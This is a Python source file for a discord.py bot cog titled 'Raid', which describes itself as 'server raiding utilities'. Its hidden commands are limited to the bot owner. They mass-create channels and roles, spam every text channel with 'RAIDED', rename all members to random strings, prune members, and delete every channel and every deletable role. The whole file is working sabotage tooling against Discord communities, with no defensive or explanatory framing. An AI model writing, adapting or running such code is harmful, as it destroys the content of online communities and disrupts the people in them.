import discord
from discord.ext import commands
import asyncio
import random
import string

class Raid(commands.Cog, name="raid"):
    """server raiding utilities."""

    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(hidden=True)
    @commands.is_owner()
    async def channelspam(self, ctx: commands.Context, name: str = "raided", amount: int = 50):
        """create a large number of channels rapidly."""
        created = 0
        for i in range(amount):
            try:
                await ctx.guild.create_text_channel(f"{name}-{i}")
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def rolespam(self, ctx: commands.Context, name: str = "raided", amount: int = 30):
        """create a large number of roles."""
        created = 0
        for i in range(amount):
            try:
                await ctx.guild.create_role(name=f"{name}-{i}")
                created += 1
                await asyncio.sleep(0.3)
            except:
                break
        await ctx.send(f"created {created} roles.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def spamchannels(self, ctx: commands.Context, amount: int = 10, *, message: str = "RAIDED"):
        """send a message to all text channels."""
        count = 0
        for channel in ctx.guild.text_channels:
            try:
                await channel.send(message)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await ctx.send(f"messaged {count} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletename(self, ctx: commands.Context):
        """rename all members to a random string."""
        count = 0
        for member in ctx.guild.members:
            if member.top_role >= ctx.guild.me.top_role:
                continue
            try:
                new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
                await member.edit(nick=new_name)
                count += 1
                await asyncio.sleep(1)
            except:
                pass
        await ctx.send(f"renamed {count} members.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def prune(self, ctx: commands.Context, days: int = 1):
        """prune members inactive for specified days."""
        try:
            pruned = await ctx.guild.prune_members(days=days)
            await ctx.send(f"pruned {pruned} members.")
        except discord.Forbidden:
            await ctx.send("missing permissions.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deletechannels(self, ctx: commands.Context):
        """delete all channels in the server."""
        count = 0
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} channels.")

    @commands.command(hidden=True)
    @commands.is_owner()
    async def deleteroles(self, ctx: commands.Context):
        """delete all deletable roles."""
        count = 0
        for role in ctx.guild.roles:
            if role.managed or role == ctx.guild.default_role:
                continue
            try:
                await role.delete()
                count += 1
                await asyncio.sleep(0.3)
            except:
                pass
        await ctx.send(f"deleted {count} roles.")


async def setup(bot: commands.Bot):
    await bot.add_cog(Raid(bot))
